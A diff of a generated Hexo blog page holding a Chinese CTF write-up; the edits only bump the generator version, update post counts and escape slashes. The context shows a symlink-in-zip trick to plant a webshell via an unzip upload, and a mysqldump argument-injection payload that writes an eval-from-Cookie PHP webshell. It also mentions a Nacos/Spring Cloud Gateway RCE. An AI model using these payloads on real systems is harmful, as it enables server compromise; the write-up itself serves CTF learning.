@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-trophy-1.png">
@@ -174,13 +174,13 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">83</span>
+          <span class="site-state-item-count">84</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -300,14 +300,14 @@
 <p>之后给了源码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]) === <span class="string">&#x27;application/zip&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
-<p>分析源码 我们上传上去的压缩包会被修改为tmp_name 并且路径是/tmp我们也是访问不到的</p>
-<p>我们能访问到的只能是默认web环境下 也就是/var/www/html</p>
+<p>分析源码 我们上传上去的压缩包会被修改为tmp_name 并且路径是&#x2F;tmp我们也是访问不到的</p>
+<p>我们能访问到的只能是默认web环境下 也就是&#x2F;var&#x2F;www&#x2F;html</p>
 <p>再根据题目描述是unzip所导致的问题 </p>
 <p>看了wp 是根据软链接这里可以理解为是win的快捷方式</p>
 <p>先来看<code>unzip -o</code>这是这道题的前提</p>
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685372533414-f6c6b521-1d9d-43f8-bafc-f94ea40e22d0.png" alt="img"></p>
 <p>我们能够通过解压覆盖原有的文件</p>
-<p>我们可以先创建一个软链接文件test 指向/var/www/html 然后打包test.zip上传上去</p>
+<p>我们可以先创建一个软链接文件test 指向&#x2F;var&#x2F;www&#x2F;html 然后打包test.zip上传上去</p>
 <p> <code>ln -s /var/www/html test</code></p>
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685373327803-af16dd07-a6f5-4219-a6ae-1f78d17dc4ab.png" alt="img"></p>
 <p>这里的<strong>符号链接其实就是软链接</strong></p>
@@ -321,7 +321,7 @@
 
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685373698097-122e454b-4967-4295-a0d2-e6d4097fda8f.png" alt="img"></p>
 <p>因为是test文件下有个test.php（我们的木马） 所以要递归处理</p>
-<p>当test.zip被解压后 会有一个指向/var/www/html 的软链接文件test 然后接着test2.zip被解压后 同名软链接文件test 会被覆盖然后  但是test目录软链接指向/var/www/html 解压的时候会把test文件中的test.php放在/var/www/html，此时我们达到了getsehll的目的，这里思路一定要捋清。</p>
+<p>当test.zip被解压后 会有一个指向&#x2F;var&#x2F;www&#x2F;html 的软链接文件test 然后接着test2.zip被解压后 同名软链接文件test 会被覆盖然后  但是test目录软链接指向&#x2F;var&#x2F;www&#x2F;html 解压的时候会把test文件中的test.php放在&#x2F;var&#x2F;www&#x2F;html，此时我们达到了getsehll的目的，这里思路一定要捋清。</p>
 <p>然后访问<code>/test.php</code>即可</p>
 <h2 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h2><p>一道mysqldump rce的题目 跟sql注入没一点关系 题目中也提示了 rce </p>
 <p>我像个铸币一样一直在试闭合方式去构造奇怪的注入点 我脑子有问题是吧</p>
@@ -336,7 +336,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?db=ctf&amp;table_2_dump=flag1%0aecho &quot;&lt;?php @eval(getallheaders()[&#x27;Cookie&#x27;])?&gt;&quot; &gt; &quot;/app/log/1.php&quot;</span><br></pre></td></tr></table></figure>
 
 <p>这里过滤了<code>$</code>可以通过<code>getallheaders()</code>截取请求头方式bypass</p>
-<p>这种做法其实我最想问这个/app/log路径是怎么来的 </p>
+<p>这种做法其实我最想问这个&#x2F;app&#x2F;log路径是怎么来的 </p>
 <p>我当时做通过报错只能获取的路径只有<code>/log</code></p>
 <h2 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h2><p>考点：一道结合身份认证绕过和Nacos结合Spring Cloud Gateway RCE利用的题目 </p>
 <p>首先是Nacos身份认证绕过漏洞 参考<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/199642.html">https://www.secpulse.com/archives/199642.html</a></p>
